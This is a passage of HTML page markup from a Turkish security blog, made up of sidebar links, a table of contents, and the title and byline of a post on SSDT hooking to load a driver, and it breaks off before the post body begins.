+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/uefi-dev/communation-between-windows-and-uefi/"
+    
+  >UEFI to Windows Communication via NVRAM Variables
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/uefi-dev/uefi-keylogger/"
+    
+  >UEFI Keylogger
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/uefi-dev/uefi-introduction/"
+    
+  >Introduction to UEFI
+    </a>
+              
+            </li></ul>
+      </div>
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/malware-dev/"
+    
+  >Malware Development
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a>
+              <div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/malware-dev/malware-resurrection/"
+    
+  >Malware Resurrection
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/malware-dev/file-icon-spoofing/"
+    
+  >PDF Icon File Spoofing
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/malware-dev/api-hashing/"
+    
+  >API Hashing
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/malware-dev/direct-syscalls/"
+    
+  >Direct Syscalls
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/malware-dev/ntapi-injection/"
+    
+  >NTAPI Injection
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/malware-dev/dll-injection/"
+    
+  >DLL Injection
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/malware-dev/shellcode-injection/"
+    
+  >Shellcode Injection
+    </a>
+              
+            </li></ul>
+      </div>
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/winkernel-dev/"
+    
+  >Windows Kernel Dev.
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a>
+              <div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/winkernel-dev/wkd-dpc/"
+    
+  >DPC
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/winkernel-dev/wkd-ssdt/"
+    
+  >SSDT
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/winkernel-dev/wkd-virtual-memory/"
+    
+  >Virtual Memory
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/winkernel-dev/wkd-ioctl/"
+    
+  >IOCTL
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/winkernel-dev/wkd-irp/"
+    
+  >IRP
+    </a>
+              
+            </li></ul>
+      </div>
+            </li></ul>
+      </div></li>
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/about/"
+    
+  >About
+    </a></li>
+      <li class="[word-break:break-word] hx-mt-5 hx-mb-2 hx-px-2 hx-py-1.5 hx-text-sm hx-font-semibold hx-text-gray-900 first:hx-mt-0 dark:hx-text-gray-100">
+        <span class="hx-cursor-default">More</span>
+      </li>
+    
+      <li><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/about/"
+    
+  >About</a></li>
+    
+    </ul>
+
+    <div class="max-xl:hx-hidden hx-h-0 hx-w-64 hx-shrink-0"></div></div>
+  
+  
+    <div class="md:hx-hidden hx-justify-end hx-sticky hx-bottom-0 hx-bg-white dark:hx-bg-dark hx-mx-4 hx-py-4 hx-shadow-[0_-12px_16px_#fff] hx-flex hx-items-center hx-gap-2 dark:hx-border-neutral-800 dark:hx-shadow-[0_-12px_16px_#111] contrast-more:hx-border-neutral-400 contrast-more:hx-shadow-none contrast-more:dark:hx-shadow-none hx-border-t" data-toggle-animation="show"><div class="hx-flex hx-justify-items-start hx-grow">
+    <button
+      title="Change language"
+      data-state="closed"
+      class="language-switcher hx-h-7 hx-rounded-md hx-px-2 hx-text-left hx-text-xs hx-font-medium hx-text-gray-600 hx-transition-colors dark:hx-text-gray-400 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 hx-grow"
+      type="button"
+      aria-label="Change language"
+    >
+      <div class="hx-flex hx-items-center hx-gap-2 hx-capitalize"><svg height=12 xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg><span>Turkish</span></div>
+    </button>
+    <ul
+      class="language-options hx-hidden hx-z-20 hx-max-h-64 hx-overflow-auto hx-rounded-md hx-ring-1 hx-ring-black/5 hx-bg-white hx-py-1 hx-text-sm hx-shadow-lg dark:hx-ring-white/20 dark:hx-bg-neutral-800"
+      style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+    >
+      
+        
+        <li class="hx-flex hx-flex-col">
+          <a
+            href="/blog/ssdt-hooking/"
+            class="hx-text-gray-800 dark:hx-text-gray-100 hover:hx-bg-primary-50 hover:hx-text-primary-600 hover:dark:hx-bg-primary-500/10 hover:dark:hx-text-primary-600 hx-relative hx-cursor-pointer hx-whitespace-nowrap hx-py-1.5 hx-transition-colors ltr:hx-pl-3 ltr:hx-pr-9 rtl:hx-pr-3 rtl:hx-pl-9"
+          >English</a>
+        </li>
+      
+        
+        <li class="hx-flex hx-flex-col">
+          <a
+            href="/tr/blog/ssdt-hooking/"
+            class="hx-text-gray-800 dark:hx-text-gray-100 hover:hx-bg-primary-50 hover:hx-text-primary-600 hover:dark:hx-bg-primary-500/10 hover:dark:hx-text-primary-600 hx-relative hx-cursor-pointer hx-whitespace-nowrap hx-py-1.5 hx-transition-colors ltr:hx-pl-3 ltr:hx-pr-9 rtl:hx-pr-3 rtl:hx-pl-9"
+          >Turkish<span class="hx-absolute hx-inset-y-0 hx-flex hx-items-center ltr:hx-right-3 rtl:hx-left-3"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span></a>
+        </li>
+      </ul>
+  </div><button
+  title="Change theme"
+  data-theme="light"
+  class="theme-toggle hx-group hx-h-7 hx-rounded-md hx-px-2 hx-text-left hx-text-xs hx-font-medium hx-text-gray-600 hx-transition-colors dark:hx-text-gray-400 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50"
+  type="button"
+  aria-label="Change theme"
+>
+  <div class="hx-flex hx-items-center hx-gap-2 hx-capitalize"><svg height=12 class="group-data-[theme=light]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><svg height=12 class="group-data-[theme=dark]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg></div>
+</button>
+</div></aside>
+    
+<nav class="hextra-toc hx-order-last hx-hidden hx-w-64 hx-shrink-0 xl:hx-block print:hx-hidden hx-px-4" aria-label="table of contents">
+    <div class="hextra-scrollbar hx-sticky hx-top-16 hx-overflow-y-auto hx-pr-4 hx-pt-6 hx-text-sm [hyphens:auto] hx-max-h-[calc(100vh-var(--navbar-height)-env(safe-area-inset-bottom))] ltr:hx--mr-4 rtl:hx--ml-4"><p class="hx-mb-4 hx-font-semibold hx-tracking-tight">On this page</p><ul>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#ssdt-hooking">SSDT Hooking
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#proje">Proje
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#previousmode-bayra%c4%9f%c4%b1">PreviousMode Bayrağı
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#ntloaddriver%c4%b1n-analiz-edilmesi">NtLoadDriver’ın Analiz Edilmesi
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#code">Code
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#kernel-mode-driver">Kernel-Mode Driver
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#user-mode-program">User-Mode Program
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#projenin-%c3%a7al%c4%b1%c5%9ft%c4%b1r%c4%b1lmas%c4%b1">Projenin Çalıştırılması
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#sonu%c3%a7">Sonuç
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#references">References
+        </a>
+      </li></ul>
+      <div class="hx-mt-8 hx-border-t hx-bg-white hx-pt-8 hx-shadow-[0_-12px_16px_white] dark:hx-bg-dark dark:hx-shadow-[0_-12px_16px_#111] hx-sticky hx-bottom-0 hx-flex hx-flex-col hx-items-start hx-gap-2 hx-pb-8 dark:hx-border-neutral-800 contrast-more:hx-border-t contrast-more:hx-border-neutral-400 contrast-more:hx-shadow-none contrast-more:dark:hx-border-neutral-400">
+        <button aria-hidden="true" id="backToTop" onClick="scrollUp();" class="hx-transition-all hx-duration-75 hx-opacity-0 hx-text-xs hx-font-medium hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-100 contrast-more:hx-text-gray-800 contrast-more:dark:hx-text-gray-50">
+          <span>Scroll to top</span>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="hx-inline ltr:hx-ml-1 rtl:hx-mr-1 hx-h-3.5 hx-w-3.5 hx-border hx-rounded-full hx-border-gray-500 hover:hx-border-gray-900 dark:hx-border-gray-400 dark:hover:hx-border-gray-100 contrast-more:hx-border-gray-800 contrast-more:dark:hx-border-gray-50">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 15.75l7.5-7.5 7.5 7.5" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </nav>
+
+
+    <article class="hx-w-full hx-break-words hx-flex hx-min-h-[calc(100vh-var(--navbar-height))] hx-min-w-0 hx-justify-center hx-pb-8 hx-pr-[calc(env(safe-area-inset-right)-1.5rem)]">
+      <main class="hx-w-full hx-min-w-0 hx-max-w-6xl hx-px-6 hx-pt-4 md:hx-px-12">
+        
+  <div class="hx-mt-1.5 hx-flex hx-items-center hx-gap-1 hx-overflow-hidden hx-text-sm hx-text-gray-500 dark:hx-text-gray-400 contrast-more:hx-text-current">
+        <div class="hx-whitespace-nowrap hx-transition-colors hx-min-w-[24px] hx-overflow-hidden hx-text-ellipsis hover:hx-text-gray-900 dark:hover:hx-text-gray-100">
+          <a href="/tr/blog/">Blogs</a>
+        </div><svg class="hx-w-3.5 hx-shrink-0 rtl:-hx-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg><div class="hx-whitespace-nowrap hx-transition-colors hx-font-medium hx-text-gray-700 contrast-more:hx-font-bold contrast-more:hx-text-current dark:hx-text-gray-100 contrast-more:dark:hx-text-current">SSDT Hooking ile User-Mode Programda Sürücü Yükleme</div>
+  </div>
+
+        <h1 class="hx-mt-2 hx-text-4xl hx-font-bold hx-tracking-tight hx-text-slate-900 dark:hx-text-slate-100">SSDT Hooking ile User-Mode Programda Sürücü Yükleme</h1>
+        <div class="hx-mt-4 hx-mb-16 hx-text-gray-500 hx-text-sm hx-flex hx-items-center hx-flex-wrap hx-gap-y-2"><span class="hx-mr-1">Şubat 22, 2025</span><span class="hx-mx-1">·</span><a
+                  href="https://github.com/0xbekoo" target="_blank"
+                  class="hx-group hx-inline-flex hx-items-center hx-text-current hx-gap-x-1.5 hx-mx-1"
+                  title="0xbekoo"
+                ><img src="https://github.com/0xbekoo.png" alt="0xbekoo" class="hx-inline-block hx-h-4 hx-w-4 hx-rounded-full" loading="lazy" />
+                  <div class="group-hover:hx-underline">0xbekoo</div>
+                </a></div>
+        <div class="content">
+          <p><img src="../../../images/posts/ssdt-hooking/banner.png" alt="" loading="lazy" /></p>
+<div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-indigo-200 hx-bg-indigo-100 hx-text-indigo-900 dark:hx-border-indigo-200/30 dark:hx-bg-indigo-900/30 dark:hx-text-indigo-200">
+  <p class="hx-flex hx-items-center hx-font-medium"><svg height=16px class="hx-inline-block hx-align-middle hx-mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>Important</p>
+
+  <div class="hx-w-full hx-min-w-0 hx-leading-7">
